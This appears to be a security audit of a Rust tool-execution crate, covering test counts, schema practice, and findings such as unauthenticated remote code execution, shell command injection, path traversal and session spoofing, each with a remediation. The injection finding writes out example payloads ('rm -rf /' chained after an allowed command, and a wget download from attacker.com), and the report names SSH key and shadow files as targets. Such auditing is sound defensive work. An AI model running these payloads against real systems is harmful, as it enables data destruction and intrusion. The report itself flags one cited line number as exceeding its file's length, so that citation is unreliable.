# Production Security and Quality Audit: op-tools

## 1. Test Suite Audit

* **Total Test Functions Count**: **49** test functions are defined across the codebase.
* **Property-Based Testing / Fuzzing**: No property-based tests (e.g., `proptest`, `quickcheck`) or fuzzing targets are present in `op-tools` or its workspace specifications.
* **Representative Tests**:
  1. `crates/op-tools/src/orchestration_plugin.rs:519` — `test_plugin_registration` (Verifies registration and count reporting within the global plugin registry).
  2. `crates/op-tools/src/builtin/file.rs:410` — `test_read_file` (Verifies safe file read behaviors in `/tmp`).
  3. `crates/op-tools/src/builtin/shell.rs:434` — `test_shell_execute` (Verifies execution and capture of shell command outputs).

---

## 2. Schema-as-Code Compliance

This codebase utilizes a schema-as-code discipline but suffers from a widespread architecture violation: data contracts for tool inputs and outputs are expressed as **ad-hoc inline strings and JSON-Schema structures** using the `json!` macro rather than versioned, centralized schemas (such as Protocol Buffers or shared JSON-Schema assets).

### Key Violations:
* **`crates/op-tools/src/builtin_old.rs:21-32`**: Input schema for the `EchoTool` is defined as an ad-hoc, inline JSON object using the `json!` macro rather than an imported, versioned schema contract.
* **`crates/op-tools/src/builtin/file.rs:113-181`**: Schema properties and required validation parameters for various file tools (`file_read`, `file_write`, `file_list`, `file_exists`, `file_stat`) are statically hardcoded using the `json!` macro instead of generating from a unified, versioned model.
* **`crates/op-tools/src/builtin/dbus_hybrid.rs:91-137`**: Data contracts for dynamic D-Bus interface types are generated via ad-hoc string matching and map injections during runtime, bypassing formal serialization validation schemas.
* **`crates/op-tools/src/builtin/incus_tools.rs:105-115`**: The `incus_list_instances` tool hardcodes JSON structures instead of leveraging versioned type definitions from a centralized repository.

---

## 3. Vulnerability and Quality Findings

### [CRITICAL] Axum HTTP Route Directly Executes Arbitrary Tools Without Validation
* **File & Line**: `crates/op-tools/src/router.rs:114-129`
* **Impact**: Extremely High / Remote Code Execution (RCE).
* **Description**: The Axum HTTP POST handler `execute_tool_handler` accepts a `Json(params): Json<Value>` from the network request and immediately invokes `tool.execute(params).await` without checking it against `InputValidator` or the security-level checks within `SecurityValidator`. Any remote caller who has access to the HTTP router path `/api/tools/:name/execute` can execute arbitrary system commands via the `shell_execute` tool or perform raw filesystem writes via `file_write` with full root privileges, completely bypassing the security architecture.
* **Remediation**: Route all incoming execution parameters in `execute_tool_handler` through the global `InputValidator` and check authorization using the `SecurityValidator` profile before dispatching to `tool.execute`.

---

### [CRITICAL] Command Injection Vulnerability in Old ShellTool Allowlist Check
* **File & Line**: `crates/op-tools/src/builtin_old.rs:135-148` and `crates/op-tools/src/builtin_old.rs:169-173`
* **Impact**: High / Privilege Escalation.
* **Description**: In the old `ShellTool` implementation, validation of command input splits the user-provided string by whitespace and checks only the *first* word (`base_cmd`) against the allowlist of safe binaries:
  ```rust
  let base_cmd = command.split_whitespace()
      .next()
      .unwrap_or(command);
  
  if !self.allowed_commands.iter().any(|c| c == base_cmd) { ... }
  ```
  However, during execution, the full, un-sanitized command string is evaluated directly within `sh -c`:
  ```rust
  match tokio::process::Command::new("sh")
      .arg("-c")
      .arg(format!("{} {}", command, args.join(" ")))
  ```
  This allowlist is trivial to bypass. An attacker can supply a command payload such as `ls; rm -rf /` or `ls && wget http://attacker.com/malicious -O /tmp/malicious`. The first word split is `ls` (which is allowed), but the subsequent shell metacharacters and injected commands are executed directly.
* **Remediation**: Do not use `sh -c` to execute commands. Instead, pass the validated command and its arguments as distinct vector elements directly to the spawned process, completely avoiding raw shell execution and shell metacharacter expansion.

---

### [HIGH] Missing Path Traversal Prevention in Old `FileReadTool`
* **File & Line**: `crates/op-tools/src/builtin_old.rs:219-250`
* **Impact**: High / Arbitrary File Disclosure.
* **Description**: Unlike the newer `SecureFileTool` in `builtin/file.rs`, the older `FileReadTool` directly executes `tokio::fs::read(path)` using the unvalidated `path` parameter supplied by the tool request. There is no verification to prevent directory traversal (`../`) or restrict the path to allowed directories. An attacker can read highly sensitive credentials, system keys, or configuration files (e.g. `/etc/shadow`, `/root/.ssh/id_rsa`).
* **Remediation**: Deprecate the old `FileReadTool` and replace it entirely with `SecureFileTool`, ensuring all read requests are validated against the `SecurityValidator`'s configured read path policies.

---

### [HIGH] Input Sanitization and Directory Whitelist Bypass via "Trusted" Sessions
* **File & Line**: `crates/op-tools/src/validation.rs:251`, `crates/op-tools/src/validation.rs:259-269`, and `crates/op-tools/src/validation.rs:348-351`
* **Impact**: Medium-High / Security Gaps via Session Spoofing.
* **Description**: The input validation engine permits sessions with `session_id` set to `"chatbot"`, `"orchestrator"`, or `"system"` (the default trusted sessions configured in `ValidationConfig::default()`) to bypass both input sanitization and security validations:
  ```rust
  // Trusted sessions (chatbot orchestrator) get minimal validation
  let is_trusted = self.config.trusted_sessions.contains(session_id);
  ```
  If an untrusted user can control or spoof the `session_id` (e.g. via HTTP headers or unauthenticated JSON parameters), they can bypass directory containment policies (`allowed_dirs`, `forbidden_dirs`) and run blacklisted shell patterns.
* **Remediation**: Ensure that session trust is determined via securely verified cryptographic claims (such as JWT/OAuth token metadata) rather than an arbitrary client-supplied string identifier.

---

### [MEDIUM] Unsafe In-Place Mutation via `simd_json::from_str` on Shared References
* **File & Line**: `crates/op-tools/src/mcptools.rs:231` and `crates/op-tools/src/builtin/agent_tool.rs:258`
* **Impact**: Low-Medium / Memory Safety & Stability.
* **Description**: In multiple locations, `unsafe { simd_json::from_str(...) }` or `unsafe { simd_json::from_slice(...) }` is used. While `simd_json` is highly performant, it is fundamentally an in-place mutating parser. If the underlying string buffer is shared, not padded correctly, or reused across multiple threads, calling these unsafe APIs can result in undefined behavior, memory corruption, or unexpected panics.
* **Remediation**: Ensure the inputs to `simd_json` are owned, mutable `String` or `Vec<u8>` buffers that are guaranteed not to be shared. If the input cannot be safely mutated, use the safe deserialization alternatives or `serde_json`.

---
## ⚠ Citation Warnings
- `crates/op-tools/src/orchestration_plugin.rs:519`: file has 476 lines
